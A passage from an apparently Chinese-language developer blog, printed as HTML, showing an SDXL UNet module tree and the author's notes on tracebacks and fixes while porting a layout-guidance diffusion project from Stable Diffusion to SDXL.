class="punctuation">,</span> affine=True)</span><br><span class="line">          (proj_in)<span class="punctuation">:</span> Linear(in_features=<span class="number">640</span><span class="punctuation">,</span> out_features=<span class="number">640</span><span class="punctuation">,</span> bias=True)</span><br><span class="line">          (transformer_blocks)<span class="punctuation">:</span> ModuleList(</span><br><span class="line">            (<span class="number">0</span><span class="number">-1</span>)<span class="punctuation">:</span> <span class="number">2</span> x BasicTransformerBlock(</span><br><span class="line">              (norm1)<span class="punctuation">:</span> LayerNorm((<span class="number">640</span><span class="punctuation">,</span>)<span class="punctuation">,</span> eps=<span class="number">1e-05</span><span class="punctuation">,</span> elementwise_affine=True)</span><br><span class="line">              (attn1)<span class="punctuation">:</span> Attention(</span><br><span class="line">                (to_q)<span class="punctuation">:</span> Linear(in_features=<span class="number">640</span><span class="punctuation">,</span> out_features=<span class="number">640</span><span class="punctuation">,</span> bias=False)</span><br><span class="line">                (to_k)<span class="punctuation">:</span> Linear(in_features=<span class="number">640</span><span class="punctuation">,</span> out_features=<span class="number">640</span><span class="punctuation">,</span> bias=False)</span><br><span class="line">                (to_v)<span class="punctuation">:</span> Linear(in_features=<span class="number">640</span><span class="punctuation">,</span> out_features=<span class="number">640</span><span class="punctuation">,</span> bias=False)</span><br><span class="line">                (to_out)<span class="punctuation">:</span> ModuleList(</span><br><span class="line">                  (<span class="number">0</span>)<span class="punctuation">:</span> Linear(in_features=<span class="number">640</span><span class="punctuation">,</span> out_features=<span class="number">640</span><span class="punctuation">,</span> bias=True)</span><br><span class="line">                  (<span class="number">1</span>)<span class="punctuation">:</span> Dropout(p=<span class="number">0.0</span><span class="punctuation">,</span> inplace=False)</span><br><span class="line">                )</span><br><span class="line">              )</span><br><span class="line">              (norm2)<span class="punctuation">:</span> LayerNorm((<span class="number">640</span><span class="punctuation">,</span>)<span class="punctuation">,</span> eps=<span class="number">1e-05</span><span class="punctuation">,</span> elementwise_affine=True)</span><br><span class="line">              (attn2)<span class="punctuation">:</span> Attention(</span><br><span class="line">                (to_q)<span class="punctuation">:</span> Linear(in_features=<span class="number">640</span><span class="punctuation">,</span> out_features=<span class="number">640</span><span class="punctuation">,</span> bias=False)</span><br><span class="line">                (to_k)<span class="punctuation">:</span> Linear(in_features=<span class="number">2048</span><span class="punctuation">,</span> out_features=<span class="number">640</span><span class="punctuation">,</span> bias=False)</span><br><span class="line">                (to_v)<span class="punctuation">:</span> Linear(in_features=<span class="number">2048</span><span class="punctuation">,</span> out_features=<span class="number">640</span><span class="punctuation">,</span> bias=False)</span><br><span class="line">                (to_out)<span class="punctuation">:</span> ModuleList(</span><br><span class="line">                  (<span class="number">0</span>)<span class="punctuation">:</span> Linear(in_features=<span class="number">640</span><span class="punctuation">,</span> out_features=<span class="number">640</span><span class="punctuation">,</span> bias=True)</span><br><span class="line">                  (<span class="number">1</span>)<span class="punctuation">:</span> Dropout(p=<span class="number">0.0</span><span class="punctuation">,</span> inplace=False)</span><br><span class="line">                )</span><br><span class="line">              )</span><br><span class="line">              (norm3)<span class="punctuation">:</span> LayerNorm((<span class="number">640</span><span class="punctuation">,</span>)<span class="punctuation">,</span> eps=<span class="number">1e-05</span><span class="punctuation">,</span> elementwise_affine=True)</span><br><span class="line">              (ff)<span class="punctuation">:</span> FeedForward(</span><br><span class="line">                (net)<span class="punctuation">:</span> ModuleList(</span><br><span class="line">                  (<span class="number">0</span>)<span class="punctuation">:</span> GEGLU(</span><br><span class="line">                    (proj)<span class="punctuation">:</span> Linear(in_features=<span class="number">640</span><span class="punctuation">,</span> out_features=<span class="number">5120</span><span class="punctuation">,</span> bias=True)</span><br><span class="line">                  )</span><br><span class="line">                  (<span class="number">1</span>)<span class="punctuation">:</span> Dropout(p=<span class="number">0.0</span><span class="punctuation">,</span> inplace=False)</span><br><span class="line">                  (<span class="number">2</span>)<span class="punctuation">:</span> Linear(in_features=<span class="number">2560</span><span class="punctuation">,</span> out_features=<span class="number">640</span><span class="punctuation">,</span> bias=True)</span><br><span class="line">                )</span><br><span class="line">              )</span><br><span class="line">            )</span><br><span class="line">          )</span><br><span class="line">          (proj_out)<span class="punctuation">:</span> Linear(in_features=<span class="number">640</span><span class="punctuation">,</span> out_features=<span class="number">640</span><span class="punctuation">,</span> bias=True)</span><br><span class="line">        )</span><br><span class="line">      )</span><br><span class="line">      (resnets)<span class="punctuation">:</span> ModuleList(</span><br><span class="line">        (<span class="number">0</span>)<span class="punctuation">:</span> ResnetBlock2D(</span><br><span class="line">          (norm1)<span class="punctuation">:</span> GroupNorm(<span class="number">32</span><span class="punctuation">,</span> <span class="number">1920</span><span class="punctuation">,</span> eps=<span class="number">1e-05</span><span class="punctuation">,</span> affine=True)</span><br><span class="line">          (conv1)<span class="punctuation">:</span> Conv2d(<span class="number">1920</span><span class="punctuation">,</span> <span class="number">640</span><span class="punctuation">,</span> kernel_size=(<span class="number">3</span><span class="punctuation">,</span> <span class="number">3</span>)<span class="punctuation">,</span> stride=(<span class="number">1</span><span class="punctuation">,</span> <span class="number">1</span>)<span class="punctuation">,</span> padding=(<span class="number">1</span><span class="punctuation">,</span> <span class="number">1</span>))</span><br><span class="line">          (time_emb_proj)<span class="punctuation">:</span> Linear(in_features=<span class="number">1280</span><span class="punctuation">,</span> out_features=<span class="number">640</span><span class="punctuation">,</span> bias=True)</span><br><span class="line">          (norm2)<span class="punctuation">:</span> GroupNorm(<span class="number">32</span><span class="punctuation">,</span> <span class="number">640</span><span class="punctuation">,</span> eps=<span class="number">1e-05</span><span class="punctuation">,</span> affine=True)</span><br><span class="line">          (dropout)<span class="punctuation">:</span> Dropout(p=<span class="number">0.0</span><span class="punctuation">,</span> inplace=False)</span><br><span class="line">          (conv2)<span class="punctuation">:</span> Conv2d(<span class="number">640</span><span class="punctuation">,</span> <span class="number">640</span><span class="punctuation">,</span> kernel_size=(<span class="number">3</span><span class="punctuation">,</span> <span class="number">3</span>)<span class="punctuation">,</span> stride=(<span class="number">1</span><span class="punctuation">,</span> <span class="number">1</span>)<span class="punctuation">,</span> padding=(<span class="number">1</span><span class="punctuation">,</span> <span class="number">1</span>))</span><br><span class="line">          (nonlinearity)<span class="punctuation">:</span> SiLU()</span><br><span class="line">          (conv_shortcut)<span class="punctuation">:</span> Conv2d(<span class="number">1920</span><span class="punctuation">,</span> <span class="number">640</span><span class="punctuation">,</span> kernel_size=(<span class="number">1</span><span class="punctuation">,</span> <span class="number">1</span>)<span class="punctuation">,</span> stride=(<span class="number">1</span><span class="punctuation">,</span> <span class="number">1</span>))</span><br><span class="line">        )</span><br><span class="line">        (<span class="number">1</span>)<span class="punctuation">:</span> ResnetBlock2D(</span><br><span class="line">          (norm1)<span class="punctuation">:</span> GroupNorm(<span class="number">32</span><span class="punctuation">,</span> <span class="number">1280</span><span class="punctuation">,</span> eps=<span class="number">1e-05</span><span class="punctuation">,</span> affine=True)</span><br><span class="line">          (conv1)<span class="punctuation">:</span> Conv2d(<span class="number">1280</span><span class="punctuation">,</span> <span class="number">640</span><span class="punctuation">,</span> kernel_size=(<span class="number">3</span><span class="punctuation">,</span> <span class="number">3</span>)<span class="punctuation">,</span> stride=(<span class="number">1</span><span class="punctuation">,</span> <span class="number">1</span>)<span class="punctuation">,</span> padding=(<span class="number">1</span><span class="punctuation">,</span> <span class="number">1</span>))</span><br><span class="line">          (time_emb_proj)<span class="punctuation">:</span> Linear(in_features=<span class="number">1280</span><span class="punctuation">,</span> out_features=<span class="number">640</span><span class="punctuation">,</span> bias=True)</span><br><span class="line">          (norm2)<span class="punctuation">:</span> GroupNorm(<span class="number">32</span><span class="punctuation">,</span> <span class="number">640</span><span class="punctuation">,</span> eps=<span class="number">1e-05</span><span class="punctuation">,</span> affine=True)</span><br><span class="line">          (dropout)<span class="punctuation">:</span> Dropout(p=<span class="number">0.0</span><span class="punctuation">,</span> inplace=False)</span><br><span class="line">          (conv2)<span class="punctuation">:</span> Conv2d(<span class="number">640</span><span class="punctuation">,</span> <span class="number">640</span><span class="punctuation">,</span> kernel_size=(<span class="number">3</span><span class="punctuation">,</span> <span class="number">3</span>)<span class="punctuation">,</span> stride=(<span class="number">1</span><span class="punctuation">,</span> <span class="number">1</span>)<span class="punctuation">,</span> padding=(<span class="number">1</span><span class="punctuation">,</span> <span class="number">1</span>))</span><br><span class="line">          (nonlinearity)<span class="punctuation">:</span> SiLU()</span><br><span class="line">          (conv_shortcut)<span class="punctuation">:</span> Conv2d(<span class="number">1280</span><span class="punctuation">,</span> <span class="number">640</span><span class="punctuation">,</span> kernel_size=(<span class="number">1</span><span class="punctuation">,</span> <span class="number">1</span>)<span class="punctuation">,</span> stride=(<span class="number">1</span><span class="punctuation">,</span> <span class="number">1</span>))</span><br><span class="line">        )</span><br><span class="line">        (<span class="number">2</span>)<span class="punctuation">:</span> ResnetBlock2D(</span><br><span class="line">          (norm1)<span class="punctuation">:</span> GroupNorm(<span class="number">32</span><span class="punctuation">,</span> <span class="number">960</span><span class="punctuation">,</span> eps=<span class="number">1e-05</span><span class="punctuation">,</span> affine=True)</span><br><span class="line">          (conv1)<span class="punctuation">:</span> Conv2d(<span class="number">960</span><span class="punctuation">,</span> <span class="number">640</span><span class="punctuation">,</span> kernel_size=(<span class="number">3</span><span class="punctuation">,</span> <span class="number">3</span>)<span class="punctuation">,</span> stride=(<span class="number">1</span><span class="punctuation">,</span> <span class="number">1</span>)<span class="punctuation">,</span> padding=(<span class="number">1</span><span class="punctuation">,</span> <span class="number">1</span>))</span><br><span class="line">          (time_emb_proj)<span class="punctuation">:</span> Linear(in_features=<span class="number">1280</span><span class="punctuation">,</span> out_features=<span class="number">640</span><span class="punctuation">,</span> bias=True)</span><br><span class="line">          (norm2)<span class="punctuation">:</span> GroupNorm(<span class="number">32</span><span class="punctuation">,</span> <span class="number">640</span><span class="punctuation">,</span> eps=<span class="number">1e-05</span><span class="punctuation">,</span> affine=True)</span><br><span class="line">          (dropout)<span class="punctuation">:</span> Dropout(p=<span class="number">0.0</span><span class="punctuation">,</span> inplace=False)</span><br><span class="line">          (conv2)<span class="punctuation">:</span> Conv2d(<span class="number">640</span><span class="punctuation">,</span> <span class="number">640</span><span class="punctuation">,</span> kernel_size=(<span class="number">3</span><span class="punctuation">,</span> <span class="number">3</span>)<span class="punctuation">,</span> stride=(<span class="number">1</span><span class="punctuation">,</span> <span class="number">1</span>)<span class="punctuation">,</span> padding=(<span class="number">1</span><span class="punctuation">,</span> <span class="number">1</span>))</span><br><span class="line">          (nonlinearity)<span class="punctuation">:</span> SiLU()</span><br><span class="line">          (conv_shortcut)<span class="punctuation">:</span> Conv2d(<span class="number">960</span><span class="punctuation">,</span> <span class="number">640</span><span class="punctuation">,</span> kernel_size=(<span class="number">1</span><span class="punctuation">,</span> <span class="number">1</span>)<span class="punctuation">,</span> stride=(<span class="number">1</span><span class="punctuation">,</span> <span class="number">1</span>))</span><br><span class="line">        )</span><br><span class="line">      )</span><br><span class="line">      (upsamplers)<span class="punctuation">:</span> ModuleList(</span><br><span class="line">        (<span class="number">0</span>)<span class="punctuation">:</span> Upsample2D(</span><br><span class="line">          (conv)<span class="punctuation">:</span> Conv2d(<span class="number">640</span><span class="punctuation">,</span> <span class="number">640</span><span class="punctuation">,</span> kernel_size=(<span class="number">3</span><span class="punctuation">,</span> <span class="number">3</span>)<span class="punctuation">,</span> stride=(<span class="number">1</span><span class="punctuation">,</span> <span class="number">1</span>)<span class="punctuation">,</span> padding=(<span class="number">1</span><span class="punctuation">,</span> <span class="number">1</span>))</span><br><span class="line">        )</span><br><span class="line">      )</span><br><span class="line">    )</span><br><span class="line">    (<span class="number">2</span>)<span class="punctuation">:</span> UpBlock2D(</span><br><span class="line">      (resnets)<span class="punctuation">:</span> ModuleList(</span><br><span class="line">        (<span class="number">0</span>)<span class="punctuation">:</span> ResnetBlock2D(</span><br><span class="line">          (norm1)<span class="punctuation">:</span> GroupNorm(<span class="number">32</span><span class="punctuation">,</span> <span class="number">960</span><span class="punctuation">,</span> eps=<span class="number">1e-05</span><span class="punctuation">,</span> affine=True)</span><br><span class="line">          (conv1)<span class="punctuation">:</span> Conv2d(<span class="number">960</span><span class="punctuation">,</span> <span class="number">320</span><span class="punctuation">,</span> kernel_size=(<span class="number">3</span><span class="punctuation">,</span> <span class="number">3</span>)<span class="punctuation">,</span> stride=(<span class="number">1</span><span class="punctuation">,</span> <span class="number">1</span>)<span class="punctuation">,</span> padding=(<span class="number">1</span><span class="punctuation">,</span> <span class="number">1</span>))</span><br><span class="line">          (time_emb_proj)<span class="punctuation">:</span> Linear(in_features=<span class="number">1280</span><span class="punctuation">,</span> out_features=<span class="number">320</span><span class="punctuation">,</span> bias=True)</span><br><span class="line">          (norm2)<span class="punctuation">:</span> GroupNorm(<span class="number">32</span><span class="punctuation">,</span> <span class="number">320</span><span class="punctuation">,</span> eps=<span class="number">1e-05</span><span class="punctuation">,</span> affine=True)</span><br><span class="line">          (dropout)<span class="punctuation">:</span> Dropout(p=<span class="number">0.0</span><span class="punctuation">,</span> inplace=False)</span><br><span class="line">          (conv2)<span class="punctuation">:</span> Conv2d(<span class="number">320</span><span class="punctuation">,</span> <span class="number">320</span><span class="punctuation">,</span> kernel_size=(<span class="number">3</span><span class="punctuation">,</span> <span class="number">3</span>)<span class="punctuation">,</span> stride=(<span class="number">1</span><span class="punctuation">,</span> <span class="number">1</span>)<span class="punctuation">,</span> padding=(<span class="number">1</span><span class="punctuation">,</span> <span class="number">1</span>))</span><br><span class="line">          (nonlinearity)<span class="punctuation">:</span> SiLU()</span><br><span class="line">          (conv_shortcut)<span class="punctuation">:</span> Conv2d(<span class="number">960</span><span class="punctuation">,</span> <span class="number">320</span><span class="punctuation">,</span> kernel_size=(<span class="number">1</span><span class="punctuation">,</span> <span class="number">1</span>)<span class="punctuation">,</span> stride=(<span class="number">1</span><span class="punctuation">,</span> <span class="number">1</span>))</span><br><span class="line">        )</span><br><span class="line">        (<span class="number">1</span><span class="number">-2</span>)<span class="punctuation">:</span> <span class="number">2</span> x ResnetBlock2D(</span><br><span class="line">          (norm1)<span class="punctuation">:</span> GroupNorm(<span class="number">32</span><span class="punctuation">,</span> <span class="number">640</span><span class="punctuation">,</span> eps=<span class="number">1e-05</span><span class="punctuation">,</span> affine=True)</span><br><span class="line">          (conv1)<span class="punctuation">:</span> Conv2d(<span class="number">640</span><span class="punctuation">,</span> <span class="number">320</span><span class="punctuation">,</span> kernel_size=(<span class="number">3</span><span class="punctuation">,</span> <span class="number">3</span>)<span class="punctuation">,</span> stride=(<span class="number">1</span><span class="punctuation">,</span> <span class="number">1</span>)<span class="punctuation">,</span> padding=(<span class="number">1</span><span class="punctuation">,</span> <span class="number">1</span>))</span><br><span class="line">          (time_emb_proj)<span class="punctuation">:</span> Linear(in_features=<span class="number">1280</span><span class="punctuation">,</span> out_features=<span class="number">320</span><span class="punctuation">,</span> bias=True)</span><br><span class="line">          (norm2)<span class="punctuation">:</span> GroupNorm(<span class="number">32</span><span class="punctuation">,</span> <span class="number">320</span><span class="punctuation">,</span> eps=<span class="number">1e-05</span><span class="punctuation">,</span> affine=True)</span><br><span class="line">          (dropout)<span class="punctuation">:</span> Dropout(p=<span class="number">0.0</span><span class="punctuation">,</span> inplace=False)</span><br><span class="line">          (conv2)<span class="punctuation">:</span> Conv2d(<span class="number">320</span><span class="punctuation">,</span> <span class="number">320</span><span class="punctuation">,</span> kernel_size=(<span class="number">3</span><span class="punctuation">,</span> <span class="number">3</span>)<span class="punctuation">,</span> stride=(<span class="number">1</span><span class="punctuation">,</span> <span class="number">1</span>)<span class="punctuation">,</span> padding=(<span class="number">1</span><span class="punctuation">,</span> <span class="number">1</span>))</span><br><span class="line">          (nonlinearity)<span class="punctuation">:</span> SiLU()</span><br><span class="line">          (conv_shortcut)<span class="punctuation">:</span> Conv2d(<span class="number">640</span><span class="punctuation">,</span> <span class="number">320</span><span class="punctuation">,</span> kernel_size=(<span class="number">1</span><span class="punctuation">,</span> <span class="number">1</span>)<span class="punctuation">,</span> stride=(<span class="number">1</span><span class="punctuation">,</span> <span class="number">1</span>))</span><br><span class="line">        )</span><br><span class="line">      )</span><br><span class="line">    )</span><br><span class="line">  )</span><br><span class="line">   (mid_block) <span class="punctuation">:</span> UNetMidBlock2DCrossAttn(</span><br><span class="line">    (attentions)<span class="punctuation">:</span> ModuleList(</span><br><span class="line">      (<span class="number">0</span>)<span class="punctuation">:</span> Transformer2DModel(</span><br><span class="line">        (norm)<span class="punctuation">:</span> GroupNorm(<span class="number">32</span><span class="punctuation">,</span> <span class="number">1280</span><span class="punctuation">,</span> eps=<span class="number">1e-06</span><span class="punctuation">,</span> affine=True)</span><br><span class="line">        (proj_in)<span class="punctuation">:</span> Linear(in_features=<span class="number">1280</span><span class="punctuation">,</span> out_features=<span class="number">1280</span><span class="punctuation">,</span> bias=True)</span><br><span class="line">        (transformer_blocks)<span class="punctuation">:</span> ModuleList(</span><br><span class="line">          (<span class="number">0</span><span class="number">-9</span>)<span class="punctuation">:</span> <span class="number">10</span> x BasicTransformerBlock(</span><br><span class="line">            (norm1)<span class="punctuation">:</span> LayerNorm((<span class="number">1280</span><span class="punctuation">,</span>)<span class="punctuation">,</span> eps=<span class="number">1e-05</span><span class="punctuation">,</span> elementwise_affine=True)</span><br><span class="line">            (attn1)<span class="punctuation">:</span> Attention(</span><br><span class="line">              (to_q)<span class="punctuation">:</span> Linear(in_features=<span class="number">1280</span><span class="punctuation">,</span> out_features=<span class="number">1280</span><span class="punctuation">,</span> bias=False)</span><br><span class="line">              (to_k)<span class="punctuation">:</span> Linear(in_features=<span class="number">1280</span><span class="punctuation">,</span> out_features=<span class="number">1280</span><span class="punctuation">,</span> bias=False)</span><br><span class="line">              (to_v)<span class="punctuation">:</span> Linear(in_features=<span class="number">1280</span><span class="punctuation">,</span> out_features=<span class="number">1280</span><span class="punctuation">,</span> bias=False)</span><br><span class="line">              (to_out)<span class="punctuation">:</span> ModuleList(</span><br><span class="line">                (<span class="number">0</span>)<span class="punctuation">:</span> Linear(in_features=<span class="number">1280</span><span class="punctuation">,</span> out_features=<span class="number">1280</span><span class="punctuation">,</span> bias=True)</span><br><span class="line">                (<span class="number">1</span>)<span class="punctuation">:</span> Dropout(p=<span class="number">0.0</span><span class="punctuation">,</span> inplace=False)</span><br><span class="line">              )</span><br><span class="line">            )</span><br><span class="line">            (norm2)<span class="punctuation">:</span> LayerNorm((<span class="number">1280</span><span class="punctuation">,</span>)<span class="punctuation">,</span> eps=<span class="number">1e-05</span><span class="punctuation">,</span> elementwise_affine=True)</span><br><span class="line">            (attn2)<span class="punctuation">:</span> Attention(</span><br><span class="line">              (to_q)<span class="punctuation">:</span> Linear(in_features=<span class="number">1280</span><span class="punctuation">,</span> out_features=<span class="number">1280</span><span class="punctuation">,</span> bias=False)</span><br><span class="line">              (to_k)<span class="punctuation">:</span> Linear(in_features=<span class="number">2048</span><span class="punctuation">,</span> out_features=<span class="number">1280</span><span class="punctuation">,</span> bias=False)</span><br><span class="line">              (to_v)<span class="punctuation">:</span> Linear(in_features=<span class="number">2048</span><span class="punctuation">,</span> out_features=<span class="number">1280</span><span class="punctuation">,</span> bias=False)</span><br><span class="line">              (to_out)<span class="punctuation">:</span> ModuleList(</span><br><span class="line">                (<span class="number">0</span>)<span class="punctuation">:</span> Linear(in_features=<span class="number">1280</span><span class="punctuation">,</span> out_features=<span class="number">1280</span><span class="punctuation">,</span> bias=True)</span><br><span class="line">                (<span class="number">1</span>)<span class="punctuation">:</span> Dropout(p=<span class="number">0.0</span><span class="punctuation">,</span> inplace=False)</span><br><span class="line">              )</span><br><span class="line">            )</span><br><span class="line">            (norm3)<span class="punctuation">:</span> LayerNorm((<span class="number">1280</span><span class="punctuation">,</span>)<span class="punctuation">,</span> eps=<span class="number">1e-05</span><span class="punctuation">,</span> elementwise_affine=True)</span><br><span class="line">            (ff)<span class="punctuation">:</span> FeedForward(</span><br><span class="line">              (net)<span class="punctuation">:</span> ModuleList(</span><br><span class="line">                (<span class="number">0</span>)<span class="punctuation">:</span> GEGLU(</span><br><span class="line">                  (proj)<span class="punctuation">:</span> Linear(in_features=<span class="number">1280</span><span class="punctuation">,</span> out_features=<span class="number">10240</span><span class="punctuation">,</span> bias=True)</span><br><span class="line">                )</span><br><span class="line">                (<span class="number">1</span>)<span class="punctuation">:</span> Dropout(p=<span class="number">0.0</span><span class="punctuation">,</span> inplace=False)</span><br><span class="line">                (<span class="number">2</span>)<span class="punctuation">:</span> Linear(in_features=<span class="number">5120</span><span class="punctuation">,</span> out_features=<span class="number">1280</span><span class="punctuation">,</span> bias=True)</span><br><span class="line">              )</span><br><span class="line">            )</span><br><span class="line">          )</span><br><span class="line">        )</span><br><span class="line">        (proj_out)<span class="punctuation">:</span> Linear(in_features=<span class="number">1280</span><span class="punctuation">,</span> out_features=<span class="number">1280</span><span class="punctuation">,</span> bias=True)</span><br><span class="line">      )</span><br><span class="line">    )</span><br><span class="line">    (resnets)<span class="punctuation">:</span> ModuleList(</span><br><span class="line">      (<span class="number">0</span><span class="number">-1</span>)<span class="punctuation">:</span> <span class="number">2</span> x ResnetBlock2D(</span><br><span class="line">        (norm1)<span class="punctuation">:</span> GroupNorm(<span class="number">32</span><span class="punctuation">,</span> <span class="number">1280</span><span class="punctuation">,</span> eps=<span class="number">1e-05</span><span class="punctuation">,</span> affine=True)</span><br><span class="line">        (conv1)<span class="punctuation">:</span> Conv2d(<span class="number">1280</span><span class="punctuation">,</span> <span class="number">1280</span><span class="punctuation">,</span> kernel_size=(<span class="number">3</span><span class="punctuation">,</span> <span class="number">3</span>)<span class="punctuation">,</span> stride=(<span class="number">1</span><span class="punctuation">,</span> <span class="number">1</span>)<span class="punctuation">,</span> padding=(<span class="number">1</span><span class="punctuation">,</span> <span class="number">1</span>))</span><br><span class="line">        (time_emb_proj)<span class="punctuation">:</span> Linear(in_features=<span class="number">1280</span><span class="punctuation">,</span> out_features=<span class="number">1280</span><span class="punctuation">,</span> bias=True)</span><br><span class="line">        (norm2)<span class="punctuation">:</span> GroupNorm(<span class="number">32</span><span class="punctuation">,</span> <span class="number">1280</span><span class="punctuation">,</span> eps=<span class="number">1e-05</span><span class="punctuation">,</span> affine=True)</span><br><span class="line">        (dropout)<span class="punctuation">:</span> Dropout(p=<span class="number">0.0</span><span class="punctuation">,</span> inplace=False)</span><br><span class="line">        (conv2)<span class="punctuation">:</span> Conv2d(<span class="number">1280</span><span class="punctuation">,</span> <span class="number">1280</span><span class="punctuation">,</span> kernel_size=(<span class="number">3</span><span class="punctuation">,</span> <span class="number">3</span>)<span class="punctuation">,</span> stride=(<span class="number">1</span><span class="punctuation">,</span> <span class="number">1</span>)<span class="punctuation">,</span> padding=(<span class="number">1</span><span class="punctuation">,</span> <span class="number">1</span>))</span><br><span class="line">        (nonlinearity)<span class="punctuation">:</span> SiLU()</span><br><span class="line">      )</span><br><span class="line">    )</span><br><span class="line">  )</span><br><span class="line">  (conv_norm_out)<span class="punctuation">:</span> GroupNorm(<span class="number">32</span><span class="punctuation">,</span> <span class="number">320</span><span class="punctuation">,</span> eps=<span class="number">1e-05</span><span class="punctuation">,</span> affine=True)</span><br><span class="line">  (conv_act)<span class="punctuation">:</span> SiLU()</span><br><span class="line">  (conv_out)<span class="punctuation">:</span> Conv2d(<span class="number">320</span><span class="punctuation">,</span> <span class="number">4</span><span class="punctuation">,</span> kernel_size=(<span class="number">3</span><span class="punctuation">,</span> <span class="number">3</span>)<span class="punctuation">,</span> stride=(<span class="number">1</span><span class="punctuation">,</span> <span class="number">1</span>)<span class="punctuation">,</span> padding=(<span class="number">1</span><span class="punctuation">,</span> <span class="number">1</span>))</span><br><span class="line">)</span><br></pre></td></tr></table></figure><hr><h1 id="4-改代码报错"><a href="#4-改代码报错" class="headerlink" title="4 改代码报错"></a>4 改代码报错</h1><h2 id="4-1-Error-1"><a href="#4-1-Error-1" class="headerlink" title="4.1 Error 1"></a>4.1 Error 1</h2><p>把加载的模型换成<code>SDXL</code>之后，运行<code>inference.py</code>文件，完整报错如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Traceback</span> (most recent call last):</span><br><span class="line">  File <span class="string">&quot;D:\Code\StableDiffusionXL\layout-guidance-main\inference.py&quot;</span>, line <span class="number">114</span>, in main</span><br><span class="line">    unet = unet_2d_condition.<span class="built_in">UNet2DConditionModel</span>(**unet_config).<span class="built_in">from_pretrained</span>(cfg.general.model_path,</span><br><span class="line">  File <span class="string">&quot;F:\anaconda\anaconda3\envs\DeltaZero\lib\site-packages\diffusers\modeling_utils.py&quot;</span>, line <span class="number">483</span>, in from_pretrained</span><br><span class="line">    model = cls.<span class="built_in">from_config</span>(config, **unused_kwargs)</span><br><span class="line">  File <span class="string">&quot;F:\anaconda\anaconda3\envs\DeltaZero\lib\site-packages\diffusers\configuration_utils.py&quot;</span>, line <span class="number">210</span>, in from_config</span><br><span class="line">    model = <span class="built_in">cls</span>(**init_dict)</span><br><span class="line">  File <span class="string">&quot;F:\anaconda\anaconda3\envs\DeltaZero\lib\site-packages\diffusers\configuration_utils.py&quot;</span>, line <span class="number">567</span>, in inner_init</span><br><span class="line">    <span class="built_in">init</span>(self, *args, **init_kwargs)</span><br><span class="line">  File <span class="string">&quot;D:\Code\StableDiffusionXL\layout-guidance-main\my_model\unet_2d_condition.py&quot;</span>, line <span class="number">136</span>, in __init__</span><br><span class="line">    down_block = <span class="built_in">get_down_block</span>(</span><br><span class="line">  File <span class="string">&quot;D:\Code\StableDiffusionXL\layout-guidance-main\my_model\unet_2d_blocks.py&quot;</span>, line <span class="number">65</span>, in get_down_block</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">CrossAttnDownBlock2D</span>(</span><br><span class="line">  File <span class="string">&quot;D:\Code\StableDiffusionXL\layout-guidance-main\my_model\unet_2d_blocks.py&quot;</span>, line <span class="number">537</span>, in __init__</span><br><span class="line">    out_channels <span class="comment">// attn_num_head_channels,</span></span><br><span class="line">TypeError: unsupported operand <span class="built_in">type</span>(s) <span class="keyword">for</span> <span class="comment">//: &#x27;int&#x27; and &#x27;list&#x27;</span></span><br></pre></td></tr></table></figure><p>这个由于对应的代码还是SD版本，更换乘SDXL即可。</p><h2 id="4-2-Error-2"><a href="#4-2-Error-2" class="headerlink" title="4.2 Error 2"></a>4.2 Error 2</h2><p>更换成SDXL之后，应该是输入的地方也要改，但是我没有读过论文，所以不知道要改哪里。</p><p>主要就是的SDXL的输入中有一个参数<code>added_cond_kwargs</code>应该设置，但是我不知道这个参数是什么意思。</p><blockquote><p>add_cond_kwargs —（ <code>dict</code> ，<em>可选</em>）：包含附加嵌入的 kwargs 字典，如果指定，则将其添加到传递到 UNet 块的嵌入中。</p></blockquote><p>能否找一下网上使用SDXL的例子，看一下这个参数是什么设置的。</p><p><a href="https://littlenyima.github.io/posts/27-sdxl-stable-diffusion-xl/index.html" title="   https://littlenyima.github.io/posts/27-sdxl-stable-diffusion-xl/index.html">   https://littlenyima.github.io/posts/27-sdxl-stable-diffusion-xl/index.html</a></p><p>在<code>Kaggle</code>环境中，我们需要安装这三个来解决这个问题。我相信关闭这个问题就可以了，感谢您的回复。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">!pip install diffusers==0.26.3</span><br><span class="line">!pip install transformers==4.38.1</span><br><span class="line">!pip install accelerate==0.27.2</span><br></pre></td></tr></table></figure><p>看一下原来是怎么使用注意力机制的。</p><h2 id="4-3-Error-3"><a href="#4-3-Error-3" class="headerlink" title="4.3 Error 3"></a>4.3 Error 3</h2><p>第一次运行代码后报错如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;/home/zql/code/layout-guidance-main/inference_xl.py&quot;</span>, line 74, <span class="keyword">in</span> main</span><br><span class="line">    pil_images = pipe(</span><br><span class="line">  File <span class="string">&quot;/home/zql/anaconda3/envs/sdxl/lib/python3.10/site-packages/torch/utils/_contextlib.py&quot;</span>, line 116, <span class="keyword">in</span> decorate_context</span><br><span class="line">    <span class="built_in">return</span> func(*args, **kwargs)</span><br><span class="line">  File <span class="string">&quot;/home/zql/code/layout-guidance-main/sdxl.py&quot;</span>, line 1223, <span class="keyword">in</span> __call__</span><br><span class="line">    noise_pred, attn_map_integrated_up, attn_map_integrated_mid, attn_map_integrated_down = \</span><br><span class="line">ValueError: not enough values to unpack (expected 4, got 1)</span><br></pre></td></tr></table></figure><p>应该是返回值只有1个，但是想要4个返回值，看一下哪里有问题。</p><p>尽管我修改了UNet2DConditionModel的代码，但是还是1个返回值，应该是它使用了标准库中的UNet2DConditionModel，而不是加载我自定义的UNet2DConditionModel，所以我应该显示的重新初始化。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pipe = StableDiffusionXLPipeline.from_pretrained(</span><br><span class="line">    <span 